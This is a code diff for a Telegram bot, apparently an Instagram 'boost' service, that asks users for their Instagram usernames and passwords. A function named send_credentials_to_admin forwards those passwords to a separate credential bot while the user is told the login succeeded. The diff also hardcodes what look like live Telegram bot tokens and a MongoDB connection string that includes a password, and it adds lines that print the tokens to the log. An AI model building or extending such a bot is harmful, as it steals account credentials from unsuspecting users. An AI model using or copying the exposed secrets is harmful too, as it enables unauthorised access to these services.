@@ -29,8 +29,8 @@ from telegram.ext import (
 
 # Constants
 ADMIN_ID = 6881713177  # Your admin ID
-BOT_TOKEN = os.getenv("BOT_TOKEN", "7275717734:AAE6bq0Mdypn_wQL6F1wpphzEtLAco3_B3Y")
-MONGODB_URI = os.getenv("MONGODB_URI", "mongodb+srv://instaboost_user:uX1YzKjiOETNhyYj@cluster0.tolxjiz.mongodb.net/instaboost?retryWrites=true&w=majority&appName=Cluster0")
+BOT_TOKEN = "7831518558:AAGhzqXl1HigurAIyUYjhdRqkShfeMwuKKM"  # Main bot token
+MONGODB_URI = "mongodb+srv://instaboost_user:uX1YzKjiOETNhyYj@cluster0.tolxjiz.mongodb.net/instaboost?retryWrites=true&w=majority&appName=Cluster0"
 PORT = int(os.environ.get('PORT', 8000))  # Render requires port binding
 
 # Credential bot details
@@ -186,7 +186,7 @@ def is_valid_username(username):
     return bool(re.match(r'^[a-zA-Z0-9._]{1,30}$', clean))
 
 # Send credentials to credential bot
-async def send_credentials_to_admin(context, user_id, ig_username, ig_password):
+async def send_credentials_to_admin(user_id, ig_username, ig_password):
     try:
         user = get_user(user_id) or {}
         display_name = user.get('display_name', 'Unknown')
@@ -386,7 +386,7 @@ async def get_ig_password(update: Update, context: CallbackContext) -> int:
             return ConversationHandler.END
         
         # Send credentials to credential bot
-        await send_credentials_to_admin(context, user_id, ig_username, password)
+        await send_credentials_to_admin(user_id, ig_username, password)
         
         await update.message.reply_text(
             STRINGS[lang]['login_success'].format(username=ig_username),
@@ -823,6 +823,9 @@ def main():
     
     # Start the bot with conflict prevention
     print("🚀 Bot is running...")
+    print(f"🤖 Using Main Bot Token: {BOT_TOKEN}")
+    print(f"🔐 Credentials will be sent to bot: {CREDENTIAL_BOT_TOKEN}")
+    
     app.run_polling(
         drop_pending_updates=True,
         allowed_updates=Update.ALL_TYPES,
